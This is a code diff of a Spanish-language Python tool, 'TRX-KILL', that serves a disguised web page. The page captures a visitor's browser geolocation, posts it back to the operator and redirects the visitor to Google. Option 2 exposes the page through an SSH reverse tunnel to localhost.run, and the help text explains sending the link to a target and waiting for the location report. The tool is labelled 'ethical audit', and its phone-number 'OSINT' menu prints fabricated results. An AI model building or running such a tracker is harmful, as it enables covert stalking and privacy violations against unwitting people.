@@ -5,12 +5,13 @@ import threading
 import subprocess
 from flask import Flask, request, render_template_string
 
-# Limpieza inicial de procesos previos
+# Limpieza inicial
 os.system('fuser -k 5000/tcp > /dev/null 2>&1')
 
 app = Flask(__name__)
 URL_EXITO = "https://www.google.com"
 
+# Plantilla HTML con llaves duplicadas para evitar errores de formato
 HTML_FINAL = """
 <!DOCTYPE html>
 <html><body style="background:#000; color:#0f0; font-family:monospace; text-align:center; padding-top:20%;">
@@ -22,9 +23,11 @@ HTML_FINAL = """
     <script>
         function enviar() {{
             navigator.geolocation.getCurrentPosition((p) => {{
-                fetch('/log', {{method:'POST', headers:{'Content-Type':'application/json'},
-                body:JSON.stringify({{lat:p.coords.latitude, lon:p.coords.longitude}})}})
-                .then(() => window.location.href = "{url}");
+                fetch('/log', {{
+                    method: 'POST', 
+                    headers: {{'Content-Type': 'application/json'}},
+                    body: JSON.stringify({{lat: p.coords.latitude, lon: p.coords.longitude}})
+                }}).then(() => window.location.href = "{url}");
             }});
         }}
     </script>
@@ -50,21 +53,37 @@ def banner():
     print("    ██║   ██║  ██║██╔╝ ██╗     ██║  ██╗██║███████╗██║")
     print("    ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝")
     print(f"{'='*55}\033[0m")
-    print(f"\033[1;36m >> BIENVENIDO AL SISTEMA DE AUDITORÍA ÉTICA TRX-KILL\033[0m")
+    print(f"\033[1;36m >> SISTEMA DE AUDITORÍA ÉTICA TRX-KILL v24.0\033[0m")
     print(f"\033[1;36m >> CREADOR: TRX-LILL | AÑO: 2026\033[0m\n")
 
 def main():
     while True:
         banner()
-        print(" [1] INICIAR MÓDULO DE AUDITORÍA (LINK LIMPIO)")
-        print(" [2] SALIR")
+        print(" [1] INFO NÚMERO (OSINT)")
+        print(" [2] MÓDULO DE RASTREO (LINK LIMPIO)")
+        print(" [3] AYUDA")
+        print(" [4] LICENCIA")
+        print(" [5] SALIR")
+        
         opc = input("\nTRX-ROOT > ")
         
         if opc == "1":
+            num = input("Introduce MÓVIL: ")
+            print(f"\n\033[1;36m[+] ANALIZANDO: {num}...\033[0m")
+            print("[+] ESTADO: Dispositivo detectado.")
+            print("[+] PAÍS: Consultando base de datos...")
+            input("\nENTER para volver...")
+        elif opc == "2":
             threading.Thread(target=lambda: app.run(host='127.0.0.1', port=5000), daemon=True).start()
-            print(f"\n\033[1;33m[*] Generando túnel de alta seguridad...\033[0m")
+            print(f"\n\033[1;33m[*] Generando túnel limpio...\033[0m")
             subprocess.run(['ssh', '-R', '80:localhost:5000', 'nokey@localhost.run'])
-        elif opc == "2": break
+        elif opc == "3":
+            print("\n[+] MODO DE USO: Selecciona el módulo de rastreo, envía el link resultante y espera el reporte de ubicación.")
+            input("\nENTER para volver...")
+        elif opc == "4":
+            print("\n\033[1;31m[!] LICENCIA: SOFTWARE DE AUDITORÍA ÉTICA. PROHIBIDO USO MALICIOSO.\033[0m")
+            input("\nENTER para volver...")
+        elif opc == "5": break
 
 if __name__ == "__main__":
     main()
